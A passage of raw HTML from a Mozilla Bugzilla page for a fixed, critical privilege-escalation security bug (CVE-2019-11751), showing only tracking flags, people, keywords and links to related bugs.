        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-view-help-link" class="help">Status:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-status-view">VERIFIED
        FIXED
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-status-edit" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-edit-help-link" class="help">Status:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-status-edit"><div class="field inline" id="field-bug_status"
>


  
    <div class="value">
        <span id="field-value-bug_status">
            VERIFIED

        </span>
    </div>

  
</div><div class="field indent inline" id="field-resolution"
>


  
    <div class="value">
        <span id="field-value-resolution">
            FIXED

        </span>
    </div>

  
</div>
  <div id="status-action-buttons">
      <div id="assigned-container" style="display:none">
        <button type="button" class="secondary" id="mark-as-assigned-btn">
          Mark as Assigned
        </button>
      </div>
  </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-target_milestone"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone" id="target_milestone-help-link" class="help">Milestone:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-target_milestone">
            mozilla70

        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-cf_fx_iteration" style="display:none"
>
    <div class="name">Iteration:
    </div>


  
    <div class="value">
        <span id="field-value-cf_fx_iteration">
            ---

        </span>
    </div>

  
</div>


      <div class="field edit-show" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags" id="-help-link" class="help">Project Flags:
        </a>
    </div>


  
    <div class=" container"><div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <td class="tracking-flag-name">a11y-review</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_a11y_review_project_flag-dirty">
  <select id="cf_a11y_review_project_flag" name="cf_a11y_review_project_flag">
        <option value="---"
          id="v4876_cf_a11y_review_project_flag" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Root Cause</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_root_cause-dirty">
  <select id="cf_root_cause" name="cf_root_cause">
        <option value="---"
          id="v4701_cf_root_cause" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Webcompat Priority</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_webcompat_priority-dirty">
  <select id="cf_webcompat_priority" name="cf_webcompat_priority">
        <option value="---"
          id="v4274_cf_webcompat_priority" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">user-doc-firefox</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_tracking_firefox_sumo-dirty">
  <select id="cf_tracking_firefox_sumo" name="cf_tracking_firefox_sumo">
        <option value="---"
          id="v4660_cf_tracking_firefox_sumo" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Fission Milestone</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_fission_milestone-dirty">
  <select id="cf_fission_milestone" name="cf_fission_milestone">
        <option value="---"
          id="v4222_cf_fission_milestone" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

      <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags" id="-help-link" class="help">Tracking Flags:
        </a>
    </div>


  
    <div class=" container"><div class="flags edit-hide">
    <table class="layout-table tracking-flags">
        <tr>
          <th></th>
          <th>Tracking</th>
          <th>Status</th>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox-esr60</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=unaffected">unaffected</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox-esr68</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox_esr68&amp;o1=equals&amp;v1=69%2B">69+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=equals&amp;v1=verified">verified</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox68</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox68&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox69</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox69&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=equals&amp;v1=verified">verified</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox70</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox70&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox70&amp;o1=equals&amp;v1=verified">verified</a>
          </td>
        </tr>
    </table>
  </div>


<div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <th></th>
        <th>Tracking</th>
        <th>Status</th>
      </tr>
      <tr>
        <td class="tracking-flag-name">relnote-firefox</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_tracking_firefox_relnote-dirty">
  <select id="cf_tracking_firefox_relnote" name="cf_tracking_firefox_relnote">
        <option value="---"
          id="v539_cf_tracking_firefox_relnote" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird_esr78</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_esr78-dirty">
  <select id="cf_tracking_thunderbird_esr78" name="cf_tracking_thunderbird_esr78">
        <option value="---"
          id="v4823_cf_tracking_thunderbird_esr78" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_esr78-dirty">
  <select id="cf_status_thunderbird_esr78" name="cf_status_thunderbird_esr78">
        <option value="---"
          id="v4829_cf_status_thunderbird_esr78" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird_esr91</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_esr91-dirty">
  <select id="cf_tracking_thunderbird_esr91" name="cf_tracking_thunderbird_esr91">
        <option value="---"
          id="v5236_cf_tracking_thunderbird_esr91" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_esr91-dirty">
  <select id="cf_status_thunderbird_esr91" name="cf_status_thunderbird_esr91">
        <option value="---"
          id="v5242_cf_status_thunderbird_esr91" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr60</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr60-dirty">
  <select id="cf_status_firefox_esr60" name="cf_status_firefox_esr60">
        <option value="unaffected"
          id="v3633_cf_status_firefox_esr60" selected
        >unaffected
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr68</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr68-dirty">
  <select id="cf_tracking_firefox_esr68" name="cf_tracking_firefox_esr68">
        <option value="69+"
          id="v4406_cf_tracking_firefox_esr68" selected
        >69+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr68-dirty">
  <select id="cf_status_firefox_esr68" name="cf_status_firefox_esr68">
        <option value="verified"
          id="v4413_cf_status_firefox_esr68" selected
        >verified
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr78</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr78-dirty">
  <select id="cf_tracking_firefox_esr78" name="cf_tracking_firefox_esr78">
        <option value="---"
          id="v4808_cf_tracking_firefox_esr78" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr78-dirty">
  <select id="cf_status_firefox_esr78" name="cf_status_firefox_esr78">
        <option value="---"
          id="v4813_cf_status_firefox_esr78" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr91</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr91-dirty">
  <select id="cf_tracking_firefox_esr91" name="cf_tracking_firefox_esr91">
        <option value="---"
          id="v5194_cf_tracking_firefox_esr91" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr91-dirty">
  <select id="cf_status_firefox_esr91" name="cf_status_firefox_esr91">
        <option value="---"
          id="v5199_cf_status_firefox_esr91" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox68</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox68-dirty">
  <select id="cf_status_firefox68" name="cf_status_firefox68">
        <option value="wontfix"
          id="v4261_cf_status_firefox68" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox69</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox69-dirty">
  <select id="cf_tracking_firefox69" name="cf_tracking_firefox69">
        <option value="+"
          id="v4323_cf_tracking_firefox69" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox69-dirty">
  <select id="cf_status_firefox69" name="cf_status_firefox69">
        <option value="verified"
          id="v4333_cf_status_firefox69" selected
        >verified
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox70</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox70-dirty">
  <select id="cf_tracking_firefox70" name="cf_tracking_firefox70">
        <option value="+"
          id="v4429_cf_tracking_firefox70" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox70-dirty">
  <select id="cf_status_firefox70" name="cf_status_firefox70">
        <option value="verified"
          id="v4439_cf_status_firefox70" selected
        >verified
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox93</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox93-dirty">
  <select id="cf_tracking_firefox93" name="cf_tracking_firefox93">
        <option value="---"
          id="v5266_cf_tracking_firefox93" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox93-dirty">
  <select id="cf_status_firefox93" name="cf_status_firefox93">
        <option value="---"
          id="v5271_cf_status_firefox93" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox94</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox94-dirty">
  <select id="cf_tracking_firefox94" name="cf_tracking_firefox94">
        <option value="---"
          id="v5284_cf_tracking_firefox94" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox94-dirty">
  <select id="cf_status_firefox94" name="cf_status_firefox94">
        <option value="---"
          id="v5289_cf_status_firefox94" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox95</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox95-dirty">
  <select id="cf_tracking_firefox95" name="cf_tracking_firefox95">
        <option value="---"
          id="v5311_cf_tracking_firefox95" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox95-dirty">
  <select id="cf_status_firefox95" name="cf_status_firefox95">
        <option value="---"
          id="v5316_cf_status_firefox95" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>

</div>
  </div>
</section>



<section class="module" id="module-people"
>
    <header id="module-people-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse People section"
           data-label-collapsed="Expand People section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-people-content"
             aria-expanded="false"
             aria-labeledby="module-people-title"
             aria-describedby="module-people-subtitle"></div>
        <h2 class="module-title" id="module-people-title">People</h2>
          <h3 class="module-subtitle" id="module-people-subtitle">
            (Reporter: abillings, Assigned: Gijs)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-people-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field edit-hide" id="field-assigned_to"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-assigned_to"><div class="vcard vcard_159069" ><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=159069" > <span class="fna">Gijs</span></a>
</div>
        </span>
    </div>

  
</div><div class="field edit-show" id="field-assigned_to" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-assigned_to">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-assignee" name="set_default_assignee" class="set-default"
          value="1" data-for="assigned_to">
        <label for="set-default-assignee">Reset Assignee to default</label>
      </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-bug_mentors" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor" id="bug_mentors-help-link" class="help">Mentors:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_mentors">---
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-qa_contact" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact" id="qa_contact-help-link" class="help">QA Contact:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-qa_contact">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-qa-contact" name="set_default_qa_contact" class="set-default"
          value="1" data-for="qa_contact">
        <label for="set-default-qa-contact">Reset QA Contact to default</label>
      </div>
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field" id="field-reporter"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter" id="reporter-help-link" class="help">Reporter:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-reporter">
            <div class="vcard vcard_280903" ><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=280903" > <span class="fna">abillings</span></a>
</div>

        </span>
    </div>

  
</div>

    <div class="field" id="field-triage_owner"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner" id="triage_owner-help-link" class="help">Triage Owner:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-triage_owner">
            <div class="vcard vcard_91159" ><img src="https://secure.gravatar.com/avatar/8f56e46f0120d9477f8f320991a2196a?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=91159" > <span class="fna">mossop</span></a>
</div>

        </span>
    </div>

  
</div>

    

    <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc" id="-help-link" class="help">CC:
        </a>
    </div>


  
    <div class=" container">


        <span aria-owns="cc-summary cc-latch">
          <span role="button" tabindex="0" id="cc-summary" data-count="19">19 people
          </span>
        </span>


        <div id="cc-list" style="display:none"></div>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-references"
>
    <header id="module-references-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse References section"
           data-label-collapsed="Expand References section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-references-content"
             aria-expanded="false"
             aria-labeledby="module-references-title"
             aria-describedby="module-references-subtitle"></div>
        <h2 class="module-title" id="module-references-title">References</h2>
      </div>
    </header>
  <div class="module-content" id="module-references-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field bug-list edit-show" id="field-dependson" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson" id="dependson-help-link" class="help">Depends on:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-dependson">
        ---
        </span>
    </div>

  
</div><div class="field bug-list edit-show" id="field-blocked" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks" id="blocked-help-link" class="help">Blocks:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-blocked">
        ---
        </span>
    </div>

  
</div>

    <div class="field bug-list" id="field-regresses"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses" id="regresses-help-link" class="help">Regressions:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-regresses">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="defect"
              aria-label="defect" data-type="defect">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED WONTFIX - -osint -private-window no longer works (configured via manually modified registry key so external links open in private windows)"
   href="/show_bug.cgi?id=1575929">1575929</a>, <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - Mailto: links in any browser (Firefox, Chrome, Edge, etc) not launching Thunderbird if configured as default mail client on Windows"
   href="/show_bug.cgi?id=1577706">1577706</a>
      </div>

        </span>
    </div>

  
</div><div class="field bug-list edit-show" id="field-regressed_by" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by" id="regressed_by-help-link" class="help">Regressed by:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-regressed_by">
        ---
        </span>
    </div>

  
</div>

    <div class="field bug-list"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#duplicates" id="-help-link" class="help">Duplicates:
        </a>
    </div>


  
    <div class="value">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="defect"
              aria-label="defect" data-type="defect">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED DUPLICATE"
   href="/show_bug.cgi?id=1572839">1572839</a>
      </div>

    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field edit-show" id="field-bug_file_loc" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc" id="bug_file_loc-help-link" class="help">URL:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_file_loc"><div class="link">
    <a href="" target="_blank"
      rel="noreferrer" title=""
      class="bug-url" data-safe="0"></a>
  </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-see_also"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also" id="see_also-help-link" class="help">See Also:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-see_also">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="defect"
              aria-label="defect" data-type="defect">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Multiple Vendor Multiple Browser Interaction URI Handler Command Injection Vulnerability"
   href="/show_bug.cgi?id=384384">IDEF2595</a>
      </div>
      <div class="bug-list">
        <span class="bug-type-label iconic" title="enhancement"
              aria-label="enhancement" data-type="enhancement">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Add -MOZ_LOG and -MOZ_LOG_FILE arguments"
   href="/show_bug.cgi?id=1443892">1443892</a>
      </div>

        </span>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-details"
>
    <header id="module-details-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Details section"
           data-label-collapsed="Expand Details section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-details-content"
             aria-expanded="false"
             aria-labeledby="module-details-title"
             aria-describedby="module-details-subtitle"></div>
        <h2 class="module-title" id="module-details-title">Details</h2>
          <h3 class="module-subtitle" id="module-details-subtitle">
            (Keywords: csectype-priv-escalation, sec-critical, Whiteboard: [adv-main69+][adv-esr68.1+])
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-details-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field edit-show" id="field-alias" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias" id="alias-help-link" class="help">Alias:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-alias">
            CVE-2019-11751

        </span>
    </div>

  
</div>

    <div class="field" id="field-keywords"
>
    <div class="name">
        <a href="/describekeywords.cgi" id="keywords-help-link" class="help">Keywords:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-keywords">
          <a href="/buglist.cgi?keywords=csectype-priv-escalation&amp;resolution=---">csectype-priv-escalation</a>, 
          <a href="/buglist.cgi?keywords=sec-critical&amp;resolution=---">sec-critical</a>
        </span>
    </div>

  
</div>

    <div class="field" id="field-status_whiteboard"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/Whiteboard" id="status_whiteboard-help-link" class="help">Whiteboard:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-status_whiteboard">[adv-main69+][adv-esr68.1+]
        </span>
    </div>

  
</div><div class="field" id="field-cf_qa_whiteboard"
>
    <div class="name">QA Whiteboard:
    </div>


  
    <div class="value">
        <span id="field-value-cf_qa_whiteboard">
            [qa-triaged]

        </span>
    </div>

  
</div>

    

    <div class="field edit-show" id="field-cf_has_regression_range" style="display:none"
>
    <div class="name">Has Regression Range:
    </div>


  
    <div class="value">
        <span id="field-value-cf_has_regression_range">
            ---

        </span>
    </div>

  
</div><div class="field edit-show" id="field-cf_has_str" style="display:none"
>
    <div class="name">Has STR:
    </div>


  
    <div class="value">
        <span id="field-value-cf_has_str">
            ---

        </span>
    </div>

  
</div>

    <div class="field" id="field-votes"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes" id="votes-help-link" class="help">Votes:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-votes">0
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field edit-show" id="field-bug_flags" style="display:none"
>
    <div class="name">Bug Flags:
    </div>


  
    <div class=" container">
        <span id="field-value-bug_flags"><div id="bug-flags" class="flags">
  <table class="layout-table">
    <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Is this bug/feature enabled in a release by a pref flag (see https://github.com/mozilla/bug-handling/blob/master/policy/feature-flags.md)?" for="flag_type-930">behind-pref</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-930-dirty">
      <select id="flag_type-930" name="flag_type-930"
        title="Is this bug/feature enabled in a release by a pref flag (see https://github.com/mozilla/bug-handling/blob/master/policy/feature-flags.md)?"
        class="bug-flag">
          <option value="X"></option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag tracking inclusion in the desktop Firefox product backlog." for="flag_type-846">firefox-backlog</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-846-dirty">
      <select id="flag_type-846" name="flag_type-846"
        title="Flag tracking inclusion in the desktop Firefox product backlog."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug." for="flag_type-803">sec-bounty</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-803-dirty">
      <select id="flag_type-803" name="flag_type-803"
        title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame." for="flag_type-913">sec-bounty-hof</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-913-dirty">
      <select id="flag_type-913" name="flag_type-913"
        title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-787">in-qa-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-787-dirty">
      <select id="flag_type-787" name="flag_type-787"
        title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>

      <td class="flag-requestee">
        <div id="requestee_type-787-container" style="display:none"><input
    name="requestee_type-787"
    value="" class="requestee bz_autocomplete_user"  id="requestee_type-787" 
  >
        </div>
      <td>

  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-37">in-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-37-dirty">
      <select id="flag_type-37" name="flag_type-37"
        title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="qe-verify: ? ➜ request to assess whether the bug should be tested manually
qe-verify: + ➜ request to verify the bug manually
qe-verify: – ➜ the bug will not/can not be verified manually" for="flag_type-864">qe-verify</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-864-dirty">
      <select id="flag_type-864" name="flag_type-864"
        title="qe-verify: ? ➜ request to assess whether the bug should be tested manually
qe-verify: + ➜ request to verify the bug manually
qe-verify: – ➜ the bug will not/can not be verified manually"
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr>
    </tbody>
  </table>
</div>
        </span>
    </div>

  
</div>
</div>

  
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-crash-data"
>
    <header id="module-crash-data-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Crash Data section"
           data-label-collapsed="Expand Crash Data section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-crash-data-content"
             aria-expanded="false"
             aria-labeledby="module-crash-data-title"
             aria-describedby="module-crash-data-subtitle"></div>
        <h2 class="module-title" id="module-crash-data-title">Crash Data</h2>
      </div>
    </header>
  <div class="module-content" id="module-crash-data-content" style="display:none"
  ><div class="field edit-show" id="field-cf_crash_signature" style="display:none"
>
    <div class="name">Signature:
    </div>


  
    <div class="value">
        <span id="field-value-cf_crash_signature">
        </span>
    </div>

  
</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-security"
>
    <header id="module-security-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Security section"
           data-label-collapsed="Expand Security section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-security-content"
             aria-expanded="false"
             aria-labeledby="module-security-title"
             aria-describedby="module-security-subtitle"></div>
        <h2 class="module-title" id="module-security-title">Security</h2>
          <h3 class="module-subtitle" id="module-security-subtitle">
            (public)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-security-content" style="display:none"
  ><div class="groups edit-hide">
    This bug is publicly visible.
</div>

<div class="groups edit-show" style="display:none">


</div>
  </div>
</section>


